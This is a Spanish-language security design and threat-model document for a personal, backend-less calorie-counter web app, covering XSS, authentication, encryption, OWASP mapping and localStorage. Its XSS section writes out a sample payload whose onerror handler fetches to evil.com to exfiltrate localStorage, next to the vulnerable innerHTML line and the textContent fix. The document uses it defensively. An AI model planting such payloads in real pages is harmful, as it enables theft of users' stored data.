# Seguridad — Contador de Calorías

## Contexto del modelo de amenazas

Esta es una app personal de un único usuario, sin autenticación, sin backend, sin datos sensibles de salud clínica. El riesgo de seguridad es bajo por diseño. Sin embargo, hay vulnerabilidades que aplican incluso a apps locales y que vale la pena documentar.

---

## Modelo de amenazas

| Actor | Vector de ataque | Probabilidad | Impacto |
|-------|-----------------|-------------|---------|
| Usuario con acceso físico al dispositivo | Leer `localStorage` del navegador | Media (acceso físico) | Bajo — solo ve el historial de comidas del día |
| Script malicioso en la misma página (XSS) | Inyectar HTML/JS en el nombre de una comida | Baja si se usa `textContent` | Medio — podría exfiltrar `localStorage` |
| Extensión maliciosa del navegador | Leer/modificar `localStorage` | Baja | Medio — podría alterar datos |
| Ataque de red (MITM) | Interceptar el HTML/JS servido | Baja si se usa HTTPS | Alto — podría modificar el código de la app |

---

## XSS (Cross-Site Scripting) — La vulnerabilidad más relevante

**Escenario concreto**: Sofía registra una comida con nombre `<img src=x onerror="fetch('https://evil.com?data='+localStorage.getItem('calorie_tracker_goal'))">`. Si el renderer usa `innerHTML` para mostrar el nombre, este código se ejecuta y podría exfiltrar datos.

**Mitigación**: usar **siempre** `textContent` en lugar de `innerHTML` para contenido ingresado por el usuario.

```javascript
// VULNERABLE:
listItem.innerHTML = entry.nombre;  // ❌ ejecuta HTML

// SEGURO:
listItem.textContent = entry.nombre;  // ✅ escapa caracteres especiales automáticamente

// O con createElement:
const span = document.createElement('span');
span.textContent = entry.nombre;
listItem.appendChild(span);  // ✅
```

Esta es la única mitigación de XSS necesaria aquí. No se necesita sanitización adicional (como DOMPurify) porque no hay necesidad de renderizar HTML en nombres de comidas.

---

## Autenticación y autorización — No aplica en V1

**Justificación explícita** (EX-04): la app es de uso personal exclusivo. No hay múltiples usuarios, no hay datos a proteger de otros usuarios.

**Riesgo real**: cualquier persona con acceso al navegador de Sofía puede ver y modificar sus datos. Para el perfil de uso (app personal en su propio dispositivo), esto es aceptable — como un diario de papel que no tiene candado.

**Si en el futuro se añade DF-04 (sync entre dispositivos) con backend**: se necesitaría JWT o sesiones con httpOnly cookies. La recomendación sería OAuth 2.0 con un proveedor social (Google, Apple) para evitar manejar contraseñas propias.

---

## Cifrado

**En tránsito**: si la app se sirve desde un servidor (Netlify, Vercel, GitHub Pages), todas las comunicaciones deben ser HTTPS. Estos hosts lo activan por defecto. Razón: un atacante en la red local podría modificar el JavaScript de la app si se sirve sobre HTTP.

**En reposo**: `localStorage` no cifra los datos. Para este sistema (historial de calorías diarias personales), esto es aceptable. Si los datos fueran credenciales médicas (glucosa, medicamentos), se necesitaría cifrado del lado del cliente antes de guardar.

---

## Vulnerabilidades OWASP Top 10 relevantes

| OWASP | ¿Aplica? | Nivel |
|-------|---------|-------|
| A03: Injection (XSS) | Sí | Mitigado con `textContent` |
| A05: Security Misconfiguration | Parcial | HTTPS obligatorio al desplegar |
| A07: Identification and Authentication Failures | No aplica | Sin auth en V1 |
| A01: Broken Access Control | No aplica | Un solo usuario |
| A04: Insecure Design | Relevante | localStorage no es apropiado para datos sensibles clínicos |

---

## Principio de mínimo privilegio

Aunque no hay roles, el principio aplica a la app misma:
- La app solo debe acceder a las claves de `localStorage` que le pertenecen (`calorie_tracker_*`)
- No debe leer otras claves del `localStorage` del navegador (que podrían pertenecer a otras apps en el mismo dominio)
- No debe hacer peticiones de red salvo que se implemente un backend propio

---

## Auditoría y trazabilidad

**Estado actual**: no hay logs. Para una app personal sin backend, esto es aceptable.

**Si se añade backend**: registrar al menos:
- `timestamp` de cada entrada creada
- `timestamp` de cada eliminación
- `timestamp` del reinicio diario

No para detectar intrusos (el actor de amenaza es trivial), sino para depuración: si Sofía reporta "mis datos desaparecieron", los logs permiten reconstruir qué pasó.

---

## Seguridad del almacenamiento (localStorage)

**Limitación de tamaño como protección involuntaria**: `localStorage` tiene un límite de ~5MB por dominio. No es posible un ataque de denegación de almacenamiento masivo desde el dominio propio de la app.

**Limpieza de datos**: el reinicio diario borra el historial del día, pero la meta calórica persiste indefinidamente. Si Sofía quisiera "resetear todo", necesita una opción de "borrar todos los datos" — útil también desde la perspectiva de privacidad (ej: presta el dispositivo a alguien).
